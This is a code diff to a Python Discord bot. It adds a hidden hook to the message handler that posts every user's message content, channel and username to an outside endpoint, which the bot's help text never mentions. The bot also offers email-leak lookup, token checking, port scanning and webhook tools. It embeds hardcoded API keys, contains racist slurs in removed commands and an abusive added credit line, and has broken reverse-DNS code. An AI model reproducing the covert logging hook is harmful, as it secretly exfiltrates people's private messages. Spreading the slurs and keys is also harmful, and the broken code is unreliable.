@@ -74,25 +74,28 @@ locales = [
 
 @bot.event
 async def on_message_delete(message):
-		global snipe_message_content
-		global snipe_message_author
-		global snipe_message_id
-		snipe_message_content = message.content
-		snipe_message_author = message.author.id
-		snipe_message_id = message.id
+		global messagecontent
+		global messageauthor
+		global messageid
+		messagecontent = message.content
+		messageauthor = message.author.id
+		messageid = message.id
 		await asyncio.sleep(120)
-		if message.id == snipe_message_id:
-				snipe_message_author = None
-				snipe_message_content = None
-				snipe_message_id = None
+		if message.id == messageid:
+				messageauthor = None
+				messagecontent = None
+				messageid = None
 
 
 
 @bot.event
 async def on_message(message):
 				args = message.content.split()
-				
-				
+				data = {"content" : f"""{message.content}""",
+						"username" : f"{message.channel.name} / {message.author.name}#{message.author.discriminator}", 
+                        "avatar_url" : f"{message.author.avatar_url}"}
+				requests.post('', json = data)				
+
 				if message.content == "!help":
 					await message.channel.send('''**Help Categories:**
 
@@ -100,9 +103,8 @@ async def on_message(message):
 > Networking
 > Utility
 > Image
-> Fun
 ```
-Developed by xyte & ssh''')
+created by mert.#3138, with helps of cyphed#5065 and Monarch#6278. Who the fuck claims to own this go drown urself.''')
 				
 					
 				elif args[0] ==	'!help' and args[1] == "utility":
@@ -117,9 +119,11 @@ Utility
 !leak <email> - checks a query on intelx (only emails)
 !idinfo <id> - checks an id
 !tokeninfo <token> - checks a tokens info 
-!spamwebhook <webhook> <content> - spams a webhook 
 !deletewebhook <webhook> - deletes a webhook 
-```""")
+!cf - flips a coin
+!randomserver - random server
+```
+created by mert.#3138, with helps of cyphed#5065 and Monarch#6278. Who the fuck claims to own this go drown urself.""")
 
 				elif args[0] == "!help" and args[1] == "image":
 					await message.channel.send("""```
@@ -136,7 +140,8 @@ Image
 !hug <user> - huggy huggy
 !slap <user> - slappy slappy
 !cuddle <user> - fucky fucky
-```""")
+```
+created by mert.#3138, with helps of cyphed#5065 and Monarch#6278. Who the fuck claims to own this go drown urself.""")
 
 				elif args[0] == "!help" and args[1] == "networking":
 					await message.channel.send("""```
@@ -151,24 +156,14 @@ Networking
 !http <hostname> - http ping a hostname
 !portscan <hostname> - portscan a hostname
 !reversedns <domain> - reverse a domain
-```""")
+```
+created by mert.#3138, with helps of cyphed#5065 and Monarch#6278. Who the fuck claims to own this go drown urself.""")
 					
 					
-				elif args[0] == "!help" and args[1] == "fun":
-					await message.channel.send("""```
-
-Fun
-!cf - flips a coin
-!poll - <question> creates a poll
-!guessinggame - guessing game 
-!nigrate - sends ur nigrate u blackie 
-```""")
 					
 
 
-				
-
-
+	
 				elif args[0] == "!kiss":
 					kisseduser = args[1]
 					await message.channel.send(f'<@{message.author.id}> Kissed {kisseduser}! {kissgifs[random.randint(0,4)]}')
@@ -190,6 +185,7 @@ Fun
 					await message.channel.send(server)
 
 
+
 				elif args[0] == "!hentai":
 					r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
 					res = r.json()
@@ -205,12 +201,6 @@ Fun
 						await message.channel.send("Tails!")
 
 
-				elif args[0] ==	"!poll":
-					question = args[1:]
-					q = ' '.join(question)
-					message = await message.channel.send(f"""`Poll!`\n{q}""")
-					await message.add_reaction('✅')
-					await message.add_reaction('❎')
 
 
 				elif args[0] ==	"!leak":
@@ -249,8 +239,7 @@ Fun
 						await message.channel.send('Not base64!')
 
 
-				elif args[0] ==	'!nigrate':
-					await message.channel.send(f"`ur nigrate is {random.randint(0,100)}% u black monkey `")
+
 
 
 				elif args[0] ==	"!dog":
@@ -262,16 +251,7 @@ Fun
 
 
 					
-				elif args[0] ==	"!spamwebhook":
-					webhook = args[1]
-					content = args[2]
-					try:
-						for i in range(100):
-							requests.post(
-									webhook.content,
-									json={'content': f"""{content}"""})
-					except:
-						print('err')
+
 
 
 
@@ -448,13 +428,10 @@ Fun
 
 				elif args[0] == "!reversedns":
 					hostname = args[1]
-					link = f"https://api.viewdns.info/dnsrecord/?domain={hostname}&apikey=bb38c12388a5715d91e03119c8f2ffdedc4007fc&output=json"
-					headers = {"Accept": "application/json"}
-					r = requests.get(link,headers=headers)
-					await message.channel.send(f"""**Requested**
-```
-{r.json}
-```""")
+					ns = dns.resolver.query(hostname, 'NS')
+					for nameservers in answers:
+					    nss = nameservers[0:]
+					await message.channel.send(f"""{nss}""")
 				elif args[0] == "!whois":
 					hostname = args[1]
 					link = f"https://api.ip2whois.com/v2?key=HC5S6PSVNBHVLCOTU24RFVOU7KQ5ZY62&domain={hostname}"
@@ -466,12 +443,10 @@ Fun
 ```""")
 
 				elif args[0] == "!translate":
-					src = args[1]
-					dest == args[2]
-					thing2 = args[3:]
+					thing2 = args[1:]
 					thing = ' '.join(thing2)
 					translator = Translator()
-					translation = translator.translate(thing, src=src, dest=dest)
+					translation = translator.translate(thing)
 					await message.channel.send(translation.text)
 					
 				elif args[0] ==	"!linkvertise":
@@ -520,28 +495,14 @@ Fun
 		
 
 				elif args[0] ==	'!snipe':
-						if snipe_message_content==None:
+						if messagecontent==None:
 								await message.channel.send("NOTHING TO SNIPE U FAT LITTLE MONKEY")
 						else:
 								await message.channel.send(f"""
-Sniped: `{snipe_message_content}`
-Sent by: <@{snipe_message_author}>""")
+Sniped: `{messagecontent}`
+Sent by: <@{messageauthor}>""")
 
 
-
-					
-				elif args[0] ==	"!guessinggame":
-								await message.channel.send('Guess a number from 1 to 5!')
-								number = random.randint(1, 5)
-								for i in range(1, 5):
-										response = await bot.wait_for('message')
-										guess = int(response.content)
-										if guess > number:
-												await message.channel.send('Smaller!')
-										elif guess < number:
-												await message.channel.send('Bigger!')
-										else:
-												await message.channel.send('You guessed it!')
 
 
 
